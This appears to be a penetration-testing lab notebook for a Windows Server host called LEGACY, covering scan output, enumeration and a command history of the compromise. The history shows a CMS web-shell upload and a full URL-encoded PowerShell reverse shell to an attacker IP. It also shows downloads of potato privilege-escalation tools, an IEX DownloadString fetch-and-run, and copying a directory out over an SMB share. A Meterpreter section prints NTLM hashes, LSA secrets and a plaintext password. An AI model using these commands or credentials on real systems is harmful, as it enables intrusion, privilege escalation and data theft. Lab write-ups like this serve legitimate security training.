# 192.168.X.249
# Navigation
- [Summary](#summary)
- [Flags](#flags)
- [Accounts](#accounts)
- [Enumeration](#enumeration)
    - [NMAP](#nmap)
    - [Local Users](#local-users)
    - [Local Groups](#local-groups)
    - [System Info](#system-info)
    - [Routes](#routes)
    - [Netstat](#netstat)
    - [Environment Vars](#environment-vars)
    - [Domain Controller Info](#domain-controller-info)
- [Services](#services)
    - [API Endpoints](#api-endpoints)
- [Command History](#command-history)
# Summary
-
# Flags    
`Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include local.txt,proof.txt`

- C:\Users\adrian\Desktop\local.txt
- C:\Users\damon\Desktop\proof.txt
# Accounts
### legacy\adrian
`see command history`   
`whoami /priv`
```
Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```
`whoami /groups`
```

```
# Enumeration
## NMAP
`sudo nmap -sV 192.168.152.249 --top-ports 1000`
```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.30)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
`sudo nmap -sV --script vuln -p- 192.168.203.249`
```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-server-header: Microsoft-IIS/10.0
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
8000/tcp  open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.30)
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| http-sql-injection: 
|   Possible sqli for queries:
|     http://192.168.203.249:8000/dashboard/javascripts/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.203.249:8000/dashboard/javascripts/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.203.249:8000/dashboard/javascripts/?C=S%3BO%3DA%27%20OR%20sqlspider
|_    http://192.168.203.249:8000/dashboard/javascripts/?C=N%3BO%3DD%27%20OR%20sqlspider
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-trace: TRACE is enabled
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.30
| vulners: 
|   cpe:/a:apache:http_server:2.4.54: 
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
|       F607361B-6369-5DF5-9B29-E90FA29DC565    9.8     https://vulners.com/githubexploit/F607361B-6369-5DF5-9B29-E90FA29DC565  *EXPLOIT*
|       CVE-2024-38476  9.8     https://vulners.com/cve/CVE-2024-38476
|       CVE-2024-38474  9.8     https://vulners.com/cve/CVE-2024-38474
|       CVE-2023-25690  9.8     https://vulners.com/cve/CVE-2023-25690
|       B02819DB-1481-56C4-BD09-6B4574297109    9.8     https://vulners.com/githubexploit/B02819DB-1481-56C4-BD09-6B4574297109  *EXPLOIT*
|       A5425A79-9D81-513A-9CC5-549D6321897C    9.8     https://vulners.com/githubexploit/A5425A79-9D81-513A-9CC5-549D6321897C  *EXPLOIT*
|       5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9    9.8     https://vulners.com/githubexploit/5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9  *EXPLOIT*
|       3F17CA20-788F-5C45-88B3-E12DB2979B7B    9.8     https://vulners.com/githubexploit/3F17CA20-788F-5C45-88B3-E12DB2979B7B  *EXPLOIT*
|       1337DAY-ID-39214        9.8     https://vulners.com/zdt/1337DAY-ID-39214        *EXPLOIT*
|       CVE-2024-38475  9.1     https://vulners.com/cve/CVE-2024-38475
|       2EF14600-503F-53AF-BA24-683481265D30    9.1     https://vulners.com/githubexploit/2EF14600-503F-53AF-BA24-683481265D30  *EXPLOIT*
|       0486EBEE-F207-570A-9AD8-33269E72220A    9.1     https://vulners.com/githubexploit/0486EBEE-F207-570A-9AD8-33269E72220A  *EXPLOIT*
|       CVE-2022-36760  9.0     https://vulners.com/cve/CVE-2022-36760
|       3F71F065-66D4-541F-A813-9F1A2F2B1D91    8.8     https://vulners.com/githubexploit/3F71F065-66D4-541F-A813-9F1A2F2B1D91  *EXPLOIT*
|       B0A9E5E8-7CCC-5984-9922-A89F11D6BF38    8.2     https://vulners.com/githubexploit/B0A9E5E8-7CCC-5984-9922-A89F11D6BF38  *EXPLOIT*
|       CVE-2024-38473  8.1     https://vulners.com/cve/CVE-2024-38473
|       249A954E-0189-5182-AE95-31C866A057E1    8.1     https://vulners.com/githubexploit/249A954E-0189-5182-AE95-31C866A057E1  *EXPLOIT*
|       23079A70-8B37-56D2-9D37-F638EBF7F8B5    8.1     https://vulners.com/githubexploit/23079A70-8B37-56D2-9D37-F638EBF7F8B5  *EXPLOIT*
|       PACKETSTORM:176334      7.5     https://vulners.com/packetstorm/PACKETSTORM:176334      *EXPLOIT*
|       F7F6E599-CEF4-5E03-8E10-FE18C4101E38    7.5     https://vulners.com/githubexploit/F7F6E599-CEF4-5E03-8E10-FE18C4101E38  *EXPLOIT*
|       E73E445F-0A0D-5966-8A21-C74FE9C0D2BC    7.5     https://vulners.com/githubexploit/E73E445F-0A0D-5966-8A21-C74FE9C0D2BC  *EXPLOIT*
|       E606D7F4-5FA2-5907-B30E-367D6FFECD89    7.5     https://vulners.com/githubexploit/E606D7F4-5FA2-5907-B30E-367D6FFECD89  *EXPLOIT*
|       E5C174E5-D6E8-56E0-8403-D287DE52EB3F    7.5     https://vulners.com/githubexploit/E5C174E5-D6E8-56E0-8403-D287DE52EB3F  *EXPLOIT*
|       DB6E1BBD-08B1-574D-A351-7D6BB9898A4A    7.5     https://vulners.com/githubexploit/DB6E1BBD-08B1-574D-A351-7D6BB9898A4A  *EXPLOIT*
|       CVE-2024-40898  7.5     https://vulners.com/cve/CVE-2024-40898
|       CVE-2024-39573  7.5     https://vulners.com/cve/CVE-2024-39573
|       CVE-2024-38477  7.5     https://vulners.com/cve/CVE-2024-38477
|       CVE-2024-38472  7.5     https://vulners.com/cve/CVE-2024-38472
|       CVE-2024-27316  7.5     https://vulners.com/cve/CVE-2024-27316
|       CVE-2023-31122  7.5     https://vulners.com/cve/CVE-2023-31122
|       CVE-2023-27522  7.5     https://vulners.com/cve/CVE-2023-27522
|       CVE-2006-20001  7.5     https://vulners.com/cve/CVE-2006-20001
|       CNVD-2024-20839 7.5     https://vulners.com/cnvd/CNVD-2024-20839
|       CNVD-2023-93320 7.5     https://vulners.com/cnvd/CNVD-2023-93320
|       CNVD-2023-80558 7.5     https://vulners.com/cnvd/CNVD-2023-80558
|       CDC791CD-A414-5ABE-A897-7CFA3C2D3D29    7.5     https://vulners.com/githubexploit/CDC791CD-A414-5ABE-A897-7CFA3C2D3D29  *EXPLOIT*
|       C9A1C0C1-B6E3-5955-A4F1-DEA0E505B14B    7.5     https://vulners.com/githubexploit/C9A1C0C1-B6E3-5955-A4F1-DEA0E505B14B  *EXPLOIT*
|       BD3652A9-D066-57BA-9943-4E34970463B9    7.5     https://vulners.com/githubexploit/BD3652A9-D066-57BA-9943-4E34970463B9  *EXPLOIT*
|       B5E74010-A082-5ECE-AB37-623A5B33FE7D    7.5     https://vulners.com/githubexploit/B5E74010-A082-5ECE-AB37-623A5B33FE7D  *EXPLOIT*
|       B0B1EF25-DE18-534A-AE5B-E6E87669C1D2    7.5     https://vulners.com/githubexploit/B0B1EF25-DE18-534A-AE5B-E6E87669C1D2  *EXPLOIT*
|       B0208442-6E17-5772-B12D-B5BE30FA5540    7.5     https://vulners.com/githubexploit/B0208442-6E17-5772-B12D-B5BE30FA5540  *EXPLOIT*
|       A820A056-9F91-5059-B0BC-8D92C7A31A52    7.5     https://vulners.com/githubexploit/A820A056-9F91-5059-B0BC-8D92C7A31A52  *EXPLOIT*
|       A66531EB-3C47-5C56-B8A6-E04B54E9D656    7.5     https://vulners.com/githubexploit/A66531EB-3C47-5C56-B8A6-E04B54E9D656  *EXPLOIT*
|       9814661A-35A4-5DB7-BB25-A1040F365C81    7.5     https://vulners.com/githubexploit/9814661A-35A4-5DB7-BB25-A1040F365C81  *EXPLOIT*
|       788E0E7C-6F5C-5DAD-9E3A-EE6D8A685F7D    7.5     https://vulners.com/githubexploit/788E0E7C-6F5C-5DAD-9E3A-EE6D8A685F7D  *EXPLOIT*
|       5A864BCC-B490-5532-83AB-2E4109BB3C31    7.5     https://vulners.com/githubexploit/5A864BCC-B490-5532-83AB-2E4109BB3C31  *EXPLOIT*
|       4B14D194-BDE3-5D7F-A262-A701F90DE667    7.5     https://vulners.com/githubexploit/4B14D194-BDE3-5D7F-A262-A701F90DE667  *EXPLOIT*
|       45D138AD-BEC6-552A-91EA-8816914CA7F4    7.5     https://vulners.com/githubexploit/45D138AD-BEC6-552A-91EA-8816914CA7F4  *EXPLOIT*
|       40879618-C556-547C-8769-9E63E83D0B55    7.5     https://vulners.com/githubexploit/40879618-C556-547C-8769-9E63E83D0B55  *EXPLOIT*
|       1F6E0709-DA03-564E-925F-3177657C053E    7.5     https://vulners.com/githubexploit/1F6E0709-DA03-564E-925F-3177657C053E  *EXPLOIT*
|       17C6AD2A-8469-56C8-BBBE-1764D0DF1680    7.5     https://vulners.com/githubexploit/17C6AD2A-8469-56C8-BBBE-1764D0DF1680  *EXPLOIT*
|       CVE-2023-38709  7.3     https://vulners.com/cve/CVE-2023-38709
|       CNVD-2024-36395 7.3     https://vulners.com/cnvd/CNVD-2024-36395
|       95499236-C9FE-56A6-9D7D-E943A24B633A    6.9     https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       CVE-2024-24795  6.3     https://vulners.com/cve/CVE-2024-24795
|       CVE-2024-39884  6.2     https://vulners.com/cve/CVE-2024-39884
|       CVE-2023-45802  5.9     https://vulners.com/cve/CVE-2023-45802
|       CVE-2022-37436  5.3     https://vulners.com/cve/CVE-2022-37436
|_      CNVD-2023-30859 5.3     https://vulners.com/cnvd/CNVD-2023-30859
| http-enum: 
|   /icons/: Potentially interesting folder w/ directory listing
|_  /img/: Potentially interesting directory w/ listing on 'apache/2.4.54 (win64) openssl/1.1.1p php/7.4.30'
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```
`sudo nmap -A -T4 -p- 192.168.152.249`
```

```
## Local Users
`Get-LocalUser`
```
Name               Enabled Description                                                                                 
----               ------- -----------                                                                                 
Administrator      True    Built-in account for administering the computer/domain                                      
adrian             True                                                                                                
damon              True                                                                                                
DefaultAccount     False   A user account managed by the system.                                                       
Guest              False   Built-in account for guest access to the computer/domain                                    
WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender Application Guard 
```
## Local Groups
`Get-LocalGroup`
```

```
## System Info
`systeminfo`
```
Host Name:                 LEGACY
OS Name:                   Microsoft Windows Server 2022 Standard
OS Version:                10.0.20348 N/A Build 20348
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00454-10000-00001-AA877
Original Install Date:     10/10/2022, 7:52:12 AM
System Boot Time:          3/28/2024, 9:26:08 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.21100432.B64.2301110304, 1/11/2023
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 966 MB
Virtual Memory: Max Size:  3,199 MB
Virtual Memory: Available: 2,160 MB
Virtual Memory: In Use:    1,039 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 4 Hotfix(s) Installed.
                           [01]: KB5017265
                           [02]: KB5012170
                           [03]: KB5017316
                           [04]: KB5016704
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.203.249
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

```
## Routes
`route print`
```
IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0  192.168.203.254  192.168.203.249     16
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
    192.168.203.0    255.255.255.0         On-link   192.168.203.249    271
  192.168.203.249  255.255.255.255         On-link   192.168.203.249    271
  192.168.203.255  255.255.255.255         On-link   192.168.203.249    271
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link   192.168.203.249    271
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link   192.168.203.249    271
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0  192.168.203.254       1
===========================================================================

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    331 ::1/128                  On-link
  1    331 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None

```
## Netstat
`netstat -ano`
```

```
## Environment Vars
`Get-ChildItem Env:`
```
Name                           Value                                                                                   
----                           -----                                                                                   
ALLUSERSPROFILE                C:\ProgramData                                                                          
AP_PARENT_PID                  2476                                                                                    
APPDATA                        C:\Users\adrian\AppData\Roaming                                                         
CommonProgramFiles             C:\Program Files\Common Files                                                           
CommonProgramFiles(x86)        C:\Program Files (x86)\Common Files                                                     
CommonProgramW6432             C:\Program Files\Common Files                                                           
COMPUTERNAME                   LEGACY                                                                                  
ComSpec                        C:\Windows\system32\cmd.exe                                                             
DriverData                     C:\Windows\System32\Drivers\DriverData                                                  
LOCALAPPDATA                   C:\Users\adrian\AppData\Local                                                           
NUMBER_OF_PROCESSORS           2                                                                                       
OS                             Windows_NT                                                                              
Path                           C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPo...
PATHEXT                        .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL                              
PROCESSOR_ARCHITECTURE         AMD64                                                                                   
PROCESSOR_IDENTIFIER           AMD64 Family 23 Model 1 Stepping 2, AuthenticAMD                                        
PROCESSOR_LEVEL                23                                                                                      
PROCESSOR_REVISION             0102                                                                                    
ProgramData                    C:\ProgramData                                                                          
ProgramFiles                   C:\Program Files                                                                        
ProgramFiles(x86)              C:\Program Files (x86)                                                                  
ProgramW6432                   C:\Program Files                                                                        
PROMPT                         $P$G                                                                                    
PSModulePath                   C:\Users\adrian\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShel...
PUBLIC                         C:\Users\Public                                                                         
SystemDrive                    C:                                                                                      
SystemRoot                     C:\Windows                                                                              
TEMP                           C:\Users\adrian\AppData\Local\Temp                                                      
TMP                            C:\Users\adrian\AppData\Local\Temp                                                      
USERDOMAIN                     LEGACY                                                                                  
USERNAME                       adrian                                                                                  
USERPROFILE                    C:\Users\adrian                                                                         
windir                         C:\Windows 
```
## Domain Controller Info
`nltest /dsgetdc:medtech`
```

```
# Services    
## API Endpoints
`gobuster dir -u http://192.168.152.249 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`    
`gobuster dir -u http://192.168.159.121:80 -w /usr/share/wordlists/dirb/big.txt -p pattern` 
`ffuf -u http://<target-ip>/FUZZ -w /usr/share/wordlists/dirb/common.txt`   
```
/*checkout*           (Status: 400) [Size: 3490]
/*docroot*            (Status: 400) [Size: 3490]
/*                    (Status: 400) [Size: 3490]
/http%3A%2F%2Fwww     (Status: 400) [Size: 3490]
Progress: 25708 / 220561 (11.66%)[ERROR] Get "http://192.168.152.249/orchard": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/http%3A              (Status: 400) [Size: 3490]
/q%26a                (Status: 400) [Size: 3490]
/**http%3a            (Status: 400) [Size: 3490]
/*http%3A             (Status: 400) [Size: 3490]
/**http%3A            (Status: 400) [Size: 3490]
/http%3A%2F%2Fyoutube (Status: 400) [Size: 3490]
/http%3A%2F%2Fblogs   (Status: 400) [Size: 3490]
/http%3A%2F%2Fblog    (Status: 400) [Size: 3490]
/**http%3A%2F%2Fwww   (Status: 400) [Size: 3490]
/s%26p                (Status: 400) [Size: 3490]
/%3FRID%3D2671        (Status: 400) [Size: 3490]
/devinmoore*          (Status: 400) [Size: 3490]
/200109*              (Status: 400) [Size: 3490]
/*sa_                 (Status: 400) [Size: 3490]
/*dc_                 (Status: 400) [Size: 3490]
/http%3A%2F%2Fcommunity (Status: 400) [Size: 3490]
/Chamillionaire%20%26%20Paul%20Wall-%20Get%20Ya%20Mind%20Correct (Status: 400) [Size: 3490]
/Clinton%20Sparks%20%26%20Diddy%20-%20Dont%20Call%20It%20A%20Comeback%28RuZtY%29 (Status: 400) [Size: 3490]
/DJ%20Haze%20%26%20The%20Game%20-%20New%20Blood%20Series%20Pt (Status: 400) [Size: 3490]
/http%3A%2F%2Fradar   (Status: 400) [Size: 3490]
/q%26a2               (Status: 400) [Size: 3490]
/login%3f             (Status: 400) [Size: 3490]
/Shakira%20Oral%20Fixation%201%20%26%202 (Status: 400) [Size: 3490]
/http%3A%2F%2Fjeremiahgrossman (Status: 400) [Size: 3490]
/http%3A%2F%2Fweblog  (Status: 400) [Size: 3490]
/http%3A%2F%2Fswik    (Status: 400) [Size: 3490]
```
`gobuster dir -u http://192.168.203.249:8000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`
```
/img                  (Status: 301) [Size: 348] [--> http://192.168.203.249:8000/img/]
/cms                  (Status: 301) [Size: 348] [--> http://192.168.203.249:8000/cms/]
/examples             (Status: 503) [Size: 407]
/licenses             (Status: 403) [Size: 426]
/dashboard            (Status: 301) [Size: 354] [--> http://192.168.203.249:8000/dashboard/]
/%20                  (Status: 403) [Size: 307]
/IMG                  (Status: 301) [Size: 348] [--> http://192.168.203.249:8000/IMG/]
/*checkout*           (Status: 403) [Size: 307]
/Img                  (Status: 301) [Size: 348] [--> http://192.168.203.249:8000/Img/]
/CMS                  (Status: 301) [Size: 348] [--> http://192.168.203.249:8000/CMS/]
/phpmyadmin           (Status: 403) [Size: 426]
/webalizer            (Status: 403) [Size: 426]
/*docroot*            (Status: 403) [Size: 307]
/*                    (Status: 403) [Size: 307]
/con                  (Status: 403) [Size: 307]
/Dashboard            (Status: 301) [Size: 354] [--> http://192.168.203.249:8000/Dashboard/]
/http%3A              (Status: 403) [Size: 307]
/**http%3a            (Status: 403) [Size: 307]
/xampp                (Status: 301) [Size: 350] [--> http://192.168.203.249:8000/xampp/]
/aux                  (Status: 403) [Size: 307]
/*http%3A             (Status: 403) [Size: 307]
/**http%3A            (Status: 403) [Size: 307]
/%C0                  (Status: 403) [Size: 307]

```
`nikto -h http://192.168.203.249:8000`
```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.203.249
+ Target Hostname:    192.168.203.249
+ Target Port:        8000
+ Start Time:         2025-05-05 15:48:29 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.30
+ /: Retrieved x-powered-by header: PHP/7.4.30.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Root page / redirects to: http://192.168.203.249/dashboard/
+ OpenSSL/1.1.1p appears to be outdated (current is at least 3.0.7). OpenSSL 1.1.1s is current for the 1.x branch and will be supported until Nov 11 2023.
+ PHP/7.4.30 appears to be outdated (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ /img/: Directory indexing found.
+ /img/: This might be interesting.
+ /icons/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /cms/: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /cms/: This might be interesting.
+ 8909 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2025-05-05 16:01:01 (GMT-4) (752 seconds)
---------------------------------------------------------------------------
```
## meterpreter
`creds_all`
```
msv credentials
===============

Username       Domain  NTLM                              SHA1
--------       ------  ----                              ----
Administrator  LEGACY  387aef0561b65e4f3cae0960b0fba2d5  d85af7697714a10fdc862d2a36cfe1cfb9df046b
adrian         LEGACY  e3cea06e2de8d54d43b84d4b5bffb5b0  0471c9cb2ae0977d6fa051e6252d272a0e81ca75

wdigest credentials
===================

Username       Domain     Password
--------       ------     --------
(null)         (null)     (null)
Administrator  LEGACY     (null)
LEGACY$        WORKGROUP  (null)
adrian         LEGACY     (null)

kerberos credentials
====================

Username       Domain     Password
--------       ------     --------
(null)         (null)     (null)
Administrator  LEGACY     (null)
adrian         LEGACY     (null)
legacy$        WORKGROUP  (null)

```
`lsa_dump_secrets`
```
Domain : LEGACY
SysKey : 64739ab3729cd3b69b8a2112d7f813bd

Local name : LEGACY ( S-1-5-21-464543310-226837244-3834982083 )
Domain name : WORKGROUP

Policy subsystem is : 1.18
LSA Key(s) : 1, default {46bb4898-e79a-4e6d-cc7f-af1d80e43084}
  [00] {46bb4898-e79a-4e6d-cc7f-af1d80e43084} 7482b9e027ae201d27c4fed1fbc83d3c6e1a2f8402772bf12a9526bc58b8c1da

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 78 3f 09 18 8d 2a f2 38 1f 7d 60 1f f0 3c 1d 2d eb 2d 66 5a cd 82 85 ba 48 e3 c7 dc 6b 39 c4 7f e5 3d 0c 94 19 60 5a d5 
    full: 783f09188d2af2381f7d601ff03c1d2deb2d665acd8285ba48e3c7dc6b39c47fe53d0c9419605ad5
    m/u : 783f09188d2af2381f7d601ff03c1d2deb2d665a / cd8285ba48e3c7dc6b39c47fe53d0c9419605ad5
old/hex : 01 00 00 00 e8 62 7c 3d 58 48 6d 54 a7 53 81 c8 0f 89 e4 3a af af 94 65 6b 69 b8 57 8c cc 5a 9d 5a 7b 07 db 01 41 3f e4 de 19 30 ac 
    full: e8627c3d58486d54a75381c80f89e43aafaf94656b69b8578ccc5a9d5a7b07db01413fe4de1930ac
    m/u : e8627c3d58486d54a75381c80f89e43aafaf9465 / 6b69b8578ccc5a9d5a7b07db01413fe4de1930ac

Secret  : NL$KM
cur/hex : 53 d8 df b0 d7 9c 7f d9 36 f1 af 1c ee e0 66 a0 24 5e bb 0f dc 2d 24 ea 71 8f 4f 4e 57 8c 23 6c 5c 27 db 63 12 27 ca 5b 2f c0 29 69 9e ac 99 de a7 a1 16 3d ad fa e0 e5 45 67 2d 33 86 24 a1 2e 
old/hex : 53 d8 df b0 d7 9c 7f d9 36 f1 af 1c ee e0 66 a0 24 5e bb 0f dc 2d 24 ea 71 8f 4f 4e 57 8c 23 6c 5c 27 db 63 12 27 ca 5b 2f c0 29 69 9e ac 99 de a7 a1 16 3d ad fa e0 e5 45 67 2d 33 86 24 a1 2e 

Secret  : _SC_Apache2.4 / service 'Apache2.4' with username : .\adrian
cur/text: RosemaryBush1!
```
# Command History
```c
    // navigate to ip:8000/examples
    // found in address tag of 503 service unavailable page
    // Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.30 Server at 192.168.203.249 Port 8000
    nikto -h http://192.168.203.249:8000
    // shows: /cms/: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies

    //ip:8000/cms/admin.php
    //LOGIN admin/admin
    //renavigate to cms/admin.php
    // files manager
    // delete both .htaccess files (dunno if necessary)
    // 50616
    // C:\staging
    // upload simple-backdoor.php -> rename to shell.pHp
    // http://192.168.203.249:8000/cms/media/shell.pHp?cmd=whoami
    // start nc -lvnp 1234
    //navigate to
    // http://192.168.217.249:8000/cms/media/shell.pHp?cmd=powershell%20-NoP%20-NonI%20-W%20Hidden%20-Command%20%22%24client%3DNew-Object%20System.Net.Sockets.TCPClient(%27192.168.45.214%27%2C1234)%3B%24stream%3D%24client.GetStream()%3B[byte[]]%24bytes%3D0..65535|%25{0}%3Bwhile((%24i%3D%24stream.Read(%24bytes%2C0%2C%24bytes.Length))%20-ne%200){%24data%3D(New-Object%20-TypeName%20System.Text.ASCIIEncoding).GetString(%24bytes%2C0%2C%24i)%3B%24sendback%3D(iex%20%24data%202%3E%261%20|%20Out-String)%3B%24sendback2%3D%24sendback%2B%27PS%20%27%2B(pwd).Path%2B%27%3E%20%27%3B%24sendbyte%3D([text.encoding]%3A%3AASCII).GetBytes(%24sendback2)%3B%24stream.Write(%24sendbyte%2C0%2C%24sendbyte.Length)%3B%24stream.Flush()}%22


    // command = ?cmd=powershell%20-NoP%20-NonI%20-W%20Hidden%20-Command%20%22%24client%3DNew-Object%20System.Net.Sockets.TCPClient%28%27192.168.45.214%27%2C1234%29%3B%24stream%3D%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%3D0..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%3D%24stream.Read%28%24bytes%2C0%2C%24bytes.Length%29%29%20-ne%200%29%7B%24data%3D%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%24i%29%3B%24sendback%3D%28iex%20%24data%202%3E%261%20%7C%20Out-String%29%3B%24sendback2%3D%24sendback%2B%27PS%20%27%2B%28pwd%29.Path%2B%27%3E%20%27%3B%24sendbyte%3D%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%22

    // get reverse shell

    whoami
    // legacy\adrian

    // powershell -c "Invoke-WebRequest -Uri http://192.168.45.214/tools/PrintSpoofer64.exe -OutFile PrintSpoofer64.exe"
    // powershell -c "Invoke-WebRequest -Uri http://192.168.45.214/tools/SigmaPotato.exe -OutFile SigmaPotato.exe"

    ./SigmaPotato.exe --revshell 192.168.45.214 4445

    powershell -c "Invoke-WebRequest -Uri http://192.168.45.214/tools/nc.exe -OutFile nc.exe"
    powershell -c "Invoke-WebRequest -Uri http://192.168.45.214/shell.ps1 -OutFile shell.ps1"
    powershell -c "Invoke-WebRequest -Uri http://192.168.45.214/tools/GodPotato35.exe -OutFile GodPotato35.exe"

  //   nc -lvnp 4446
  //  .\godpotato35.exe -cmd "C:\xampp\htdocs\cms\media\nc.exe 192.168.45.214 4446 -e cmd.exe"
    nc -lvnp 4444
   .\GodPotato35.exe -cmd "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.45.214/shell.ps1')"

  //  C:\Users\damon>more .gitconfig
  //   more .gitconfig
  //   [safe]
  //           directory = C:/staging
  //   [user]
  //           email = damian
  //           name = damian
  mkdir /tmp/exfil
  sudo impacket-smbserver share /tmp/exfil -smb2support
   //on target
  net use Z: \\192.168.45.214\share
  xcopy C:\staging \\192.168.45.214\share /E /I /H
  xcopy C:\staging Z:\staging /E /I /H /C /Y

  powershell -c Compress-Archive -Path C:\staging -DestinationPath C:\staging.zip
